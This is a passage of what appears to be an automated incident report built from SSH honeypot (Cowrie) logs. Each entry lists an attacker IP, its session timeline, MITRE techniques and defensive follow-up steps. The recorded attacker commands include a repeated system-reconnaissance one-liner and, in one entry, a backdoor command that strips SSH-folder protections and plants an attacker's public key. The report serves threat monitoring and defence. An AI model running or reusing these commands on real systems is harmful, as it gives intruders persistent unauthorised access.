- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08928c4575bc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:28 |
| **Last Seen** | 2026-07-17 04:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:28:32` | `cowrie.session.connect` |
| `2026-07-17 04:28:32` | `cowrie.client.version` |
| `2026-07-17 04:28:32` | `cowrie.client.kex` |
| `2026-07-17 04:28:33` | `cowrie.login.success` |
| `2026-07-17 04:28:34` | `cowrie.session.params` |
| `2026-07-17 04:28:34` | `cowrie.command.input` |
| `2026-07-17 04:28:34` | `cowrie.command.input` |
| `2026-07-17 04:28:34` | `cowrie.command.input` |
| `2026-07-17 04:28:34` | `cowrie.command.input` |
| `2026-07-17 04:28:34` | `cowrie.command.input` |
| `2026-07-17 04:28:34` | `cowrie.command.success` |
| `2026-07-17 04:28:34` | `cowrie.command.input` |
| `2026-07-17 04:28:34` | `cowrie.command.input` |
| `2026-07-17 04:28:34` | `cowrie.command.input` |
| `2026-07-17 04:28:34` | `cowrie.command.input` |
| `2026-07-17 04:28:34` | `cowrie.log.closed` |
| `2026-07-17 04:28:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68c67ab4b49f

| Field | Detail |
|---|---|
| **Source IP** | `220.189.209[.]18` |
| **First Seen** | 2026-07-17 04:28 |
| **Last Seen** | 2026-07-17 04:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:28:38` | `cowrie.session.connect` |
| `2026-07-17 04:28:39` | `cowrie.client.version` |
| `2026-07-17 04:28:39` | `cowrie.client.kex` |
| `2026-07-17 04:28:41` | `cowrie.login.success` |
| `2026-07-17 04:28:42` | `cowrie.direct-tcpip.request` |
| `2026-07-17 04:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.189.209[.]18` to AbuseIPDB if not already reported
- [ ] Block `220.189.209[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8d4217c135f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:30 |
| **Last Seen** | 2026-07-17 04:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:30:13` | `cowrie.session.connect` |
| `2026-07-17 04:30:13` | `cowrie.client.version` |
| `2026-07-17 04:30:13` | `cowrie.client.kex` |
| `2026-07-17 04:30:14` | `cowrie.login.success` |
| `2026-07-17 04:30:15` | `cowrie.session.params` |
| `2026-07-17 04:30:15` | `cowrie.command.input` |
| `2026-07-17 04:30:15` | `cowrie.command.input` |
| `2026-07-17 04:30:15` | `cowrie.command.input` |
| `2026-07-17 04:30:15` | `cowrie.command.input` |
| `2026-07-17 04:30:15` | `cowrie.command.input` |
| `2026-07-17 04:30:15` | `cowrie.command.success` |
| `2026-07-17 04:30:15` | `cowrie.command.input` |
| `2026-07-17 04:30:15` | `cowrie.command.input` |
| `2026-07-17 04:30:15` | `cowrie.command.input` |
| `2026-07-17 04:30:15` | `cowrie.command.input` |
| `2026-07-17 04:30:16` | `cowrie.log.closed` |
| `2026-07-17 04:30:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6569c247e863

| Field | Detail |
|---|---|
| **Source IP** | `60.174.205[.]133` |
| **First Seen** | 2026-07-17 04:31 |
| **Last Seen** | 2026-07-17 04:36 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:31:01` | `cowrie.session.connect` |
| `2026-07-17 04:31:02` | `cowrie.client.version` |
| `2026-07-17 04:31:02` | `cowrie.client.kex` |
| `2026-07-17 04:31:03` | `cowrie.login.success` |
| `2026-07-17 04:31:04` | `cowrie.session.params` |
| `2026-07-17 04:31:04` | `cowrie.command.input` |
| `2026-07-17 04:31:04` | `cowrie.command.failed` |
| `2026-07-17 04:31:05` | `cowrie.log.closed` |
| `2026-07-17 04:31:06` | `cowrie.session.params` |
| `2026-07-17 04:31:06` | `cowrie.command.input` |
| `2026-07-17 04:31:06` | `cowrie.session.file_download` |
| `2026-07-17 04:31:06` | `cowrie.log.closed` |
| `2026-07-17 04:36:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.205[.]133` to AbuseIPDB if not already reported
- [ ] Block `60.174.205[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d8a742f8ce6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:31 |
| **Last Seen** | 2026-07-17 04:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:31:56` | `cowrie.session.connect` |
| `2026-07-17 04:31:56` | `cowrie.client.version` |
| `2026-07-17 04:31:56` | `cowrie.client.kex` |
| `2026-07-17 04:31:57` | `cowrie.login.success` |
| `2026-07-17 04:31:58` | `cowrie.session.params` |
| `2026-07-17 04:31:58` | `cowrie.command.input` |
| `2026-07-17 04:31:58` | `cowrie.command.input` |
| `2026-07-17 04:31:58` | `cowrie.command.input` |
| `2026-07-17 04:31:58` | `cowrie.command.input` |
| `2026-07-17 04:31:58` | `cowrie.command.input` |
| `2026-07-17 04:31:58` | `cowrie.command.success` |
| `2026-07-17 04:31:58` | `cowrie.command.input` |
| `2026-07-17 04:31:58` | `cowrie.command.input` |
| `2026-07-17 04:31:58` | `cowrie.command.input` |
| `2026-07-17 04:31:58` | `cowrie.command.input` |
| `2026-07-17 04:31:58` | `cowrie.log.closed` |
| `2026-07-17 04:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11e569f6c812

| Field | Detail |
|---|---|
| **Source IP** | `82.65.140[.]218` |
| **First Seen** | 2026-07-17 04:31 |
| **Last Seen** | 2026-07-17 04:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:31:56` | `cowrie.session.connect` |
| `2026-07-17 04:31:56` | `cowrie.client.version` |
| `2026-07-17 04:31:56` | `cowrie.client.kex` |
| `2026-07-17 04:31:57` | `cowrie.login.success` |
| `2026-07-17 04:31:57` | `cowrie.direct-tcpip.request` |
| `2026-07-17 04:32:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.65.140[.]218` to AbuseIPDB if not already reported
- [ ] Block `82.65.140[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dab7f67c9e77

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:33 |
| **Last Seen** | 2026-07-17 04:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:33:44` | `cowrie.session.connect` |
| `2026-07-17 04:33:45` | `cowrie.client.version` |
| `2026-07-17 04:33:45` | `cowrie.client.kex` |
| `2026-07-17 04:33:45` | `cowrie.login.success` |
| `2026-07-17 04:33:46` | `cowrie.session.params` |
| `2026-07-17 04:33:46` | `cowrie.command.input` |
| `2026-07-17 04:33:46` | `cowrie.command.input` |
| `2026-07-17 04:33:46` | `cowrie.command.input` |
| `2026-07-17 04:33:46` | `cowrie.command.input` |
| `2026-07-17 04:33:46` | `cowrie.command.input` |
| `2026-07-17 04:33:46` | `cowrie.command.success` |
| `2026-07-17 04:33:46` | `cowrie.command.input` |
| `2026-07-17 04:33:46` | `cowrie.command.input` |
| `2026-07-17 04:33:46` | `cowrie.command.input` |
| `2026-07-17 04:33:46` | `cowrie.command.input` |
| `2026-07-17 04:33:47` | `cowrie.log.closed` |
| `2026-07-17 04:33:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-919edbd8f402

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:35 |
| **Last Seen** | 2026-07-17 04:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:35:33` | `cowrie.session.connect` |
| `2026-07-17 04:35:33` | `cowrie.client.version` |
| `2026-07-17 04:35:33` | `cowrie.client.kex` |
| `2026-07-17 04:35:34` | `cowrie.login.success` |
| `2026-07-17 04:35:35` | `cowrie.session.params` |
| `2026-07-17 04:35:35` | `cowrie.command.input` |
| `2026-07-17 04:35:35` | `cowrie.command.input` |
| `2026-07-17 04:35:35` | `cowrie.command.input` |
| `2026-07-17 04:35:35` | `cowrie.command.input` |
| `2026-07-17 04:35:35` | `cowrie.command.input` |
| `2026-07-17 04:35:35` | `cowrie.command.success` |
| `2026-07-17 04:35:35` | `cowrie.command.input` |
| `2026-07-17 04:35:35` | `cowrie.command.input` |
| `2026-07-17 04:35:35` | `cowrie.command.input` |
| `2026-07-17 04:35:35` | `cowrie.command.input` |
| `2026-07-17 04:35:35` | `cowrie.log.closed` |
| `2026-07-17 04:35:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb1cc65c468d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:37 |
| **Last Seen** | 2026-07-17 04:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:37:23` | `cowrie.session.connect` |
| `2026-07-17 04:37:24` | `cowrie.client.version` |
| `2026-07-17 04:37:24` | `cowrie.client.kex` |
| `2026-07-17 04:37:25` | `cowrie.login.success` |
| `2026-07-17 04:37:26` | `cowrie.session.params` |
| `2026-07-17 04:37:26` | `cowrie.command.input` |
| `2026-07-17 04:37:26` | `cowrie.command.input` |
| `2026-07-17 04:37:26` | `cowrie.command.input` |
| `2026-07-17 04:37:26` | `cowrie.command.input` |
| `2026-07-17 04:37:26` | `cowrie.command.input` |
| `2026-07-17 04:37:26` | `cowrie.command.success` |
| `2026-07-17 04:37:26` | `cowrie.command.input` |
| `2026-07-17 04:37:26` | `cowrie.command.input` |
| `2026-07-17 04:37:26` | `cowrie.command.input` |
| `2026-07-17 04:37:26` | `cowrie.command.input` |
| `2026-07-17 04:37:26` | `cowrie.log.closed` |
| `2026-07-17 04:37:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcfab9618905

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:39 |
| **Last Seen** | 2026-07-17 04:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:39:18` | `cowrie.session.connect` |
| `2026-07-17 04:39:18` | `cowrie.client.version` |
| `2026-07-17 04:39:18` | `cowrie.client.kex` |
| `2026-07-17 04:39:20` | `cowrie.login.success` |
| `2026-07-17 04:39:21` | `cowrie.session.params` |
| `2026-07-17 04:39:21` | `cowrie.command.input` |
| `2026-07-17 04:39:21` | `cowrie.command.input` |
| `2026-07-17 04:39:21` | `cowrie.command.input` |
| `2026-07-17 04:39:21` | `cowrie.command.input` |
| `2026-07-17 04:39:21` | `cowrie.command.input` |
| `2026-07-17 04:39:21` | `cowrie.command.success` |
| `2026-07-17 04:39:21` | `cowrie.command.input` |
| `2026-07-17 04:39:21` | `cowrie.command.input` |
| `2026-07-17 04:39:21` | `cowrie.command.input` |
| `2026-07-17 04:39:21` | `cowrie.command.input` |
| `2026-07-17 04:39:21` | `cowrie.log.closed` |
| `2026-07-17 04:39:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e76efd43f47c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:41 |
| **Last Seen** | 2026-07-17 04:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:41:13` | `cowrie.session.connect` |
| `2026-07-17 04:41:13` | `cowrie.client.version` |
| `2026-07-17 04:41:13` | `cowrie.client.kex` |
| `2026-07-17 04:41:14` | `cowrie.login.success` |
| `2026-07-17 04:41:15` | `cowrie.session.params` |
| `2026-07-17 04:41:15` | `cowrie.command.input` |
| `2026-07-17 04:41:15` | `cowrie.command.input` |
| `2026-07-17 04:41:15` | `cowrie.command.input` |
| `2026-07-17 04:41:15` | `cowrie.command.input` |
| `2026-07-17 04:41:15` | `cowrie.command.input` |
| `2026-07-17 04:41:15` | `cowrie.command.success` |
| `2026-07-17 04:41:15` | `cowrie.command.input` |
| `2026-07-17 04:41:15` | `cowrie.command.input` |
| `2026-07-17 04:41:15` | `cowrie.command.input` |
| `2026-07-17 04:41:15` | `cowrie.command.input` |
| `2026-07-17 04:41:15` | `cowrie.log.closed` |
| `2026-07-17 04:41:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bd63f524d1a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:43 |
| **Last Seen** | 2026-07-17 04:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:43:01` | `cowrie.session.connect` |
| `2026-07-17 04:43:02` | `cowrie.client.version` |
| `2026-07-17 04:43:02` | `cowrie.client.kex` |
| `2026-07-17 04:43:03` | `cowrie.login.success` |
| `2026-07-17 04:43:04` | `cowrie.session.params` |
| `2026-07-17 04:43:04` | `cowrie.command.input` |
| `2026-07-17 04:43:04` | `cowrie.command.input` |
| `2026-07-17 04:43:04` | `cowrie.command.input` |
| `2026-07-17 04:43:04` | `cowrie.command.input` |
| `2026-07-17 04:43:04` | `cowrie.command.input` |
| `2026-07-17 04:43:04` | `cowrie.command.success` |
| `2026-07-17 04:43:04` | `cowrie.command.input` |
| `2026-07-17 04:43:04` | `cowrie.command.input` |
| `2026-07-17 04:43:04` | `cowrie.command.input` |
| `2026-07-17 04:43:04` | `cowrie.command.input` |
| `2026-07-17 04:43:04` | `cowrie.log.closed` |
| `2026-07-17 04:43:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75fe5830bce9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:44 |
| **Last Seen** | 2026-07-17 04:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:44:48` | `cowrie.session.connect` |
| `2026-07-17 04:44:48` | `cowrie.client.version` |
| `2026-07-17 04:44:48` | `cowrie.client.kex` |
| `2026-07-17 04:44:49` | `cowrie.login.success` |
| `2026-07-17 04:44:50` | `cowrie.session.params` |
| `2026-07-17 04:44:50` | `cowrie.command.input` |
| `2026-07-17 04:44:50` | `cowrie.command.input` |
| `2026-07-17 04:44:50` | `cowrie.command.input` |
| `2026-07-17 04:44:50` | `cowrie.command.input` |
| `2026-07-17 04:44:50` | `cowrie.command.input` |
| `2026-07-17 04:44:50` | `cowrie.command.success` |
| `2026-07-17 04:44:50` | `cowrie.command.input` |
| `2026-07-17 04:44:50` | `cowrie.command.input` |
| `2026-07-17 04:44:50` | `cowrie.command.input` |
| `2026-07-17 04:44:50` | `cowrie.command.input` |
| `2026-07-17 04:44:50` | `cowrie.log.closed` |
| `2026-07-17 04:44:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5dee66ed07a

| Field | Detail |
|---|---|
| **Source IP** | `121.159.71[.]249` |
| **First Seen** | 2026-07-17 04:46 |
| **Last Seen** | 2026-07-17 04:46 |
| **Session Duration** | 8s |
